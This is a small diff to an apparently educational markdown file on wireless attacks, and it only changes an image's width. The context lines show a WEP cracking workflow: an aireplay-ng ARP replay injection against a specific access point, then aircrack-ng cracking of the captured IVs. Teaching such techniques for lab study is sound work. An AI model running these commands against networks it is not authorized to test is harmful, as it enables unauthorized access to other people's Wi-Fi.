@@ -371,7 +371,7 @@ sudo aireplay-ng -3 -b 14:D6:4D:26:73:96 -h 66:B9:B8:1D:EC:66 wlan1
 sudo aircrack-ng wep-01.ivs
 ```
 
-<img src="./images/wep_attack_arp_replay.png" width="500"/>
+<img src="./images/wep_attack_arp_replay.png" width="800"/>
 
 
 ## WPA
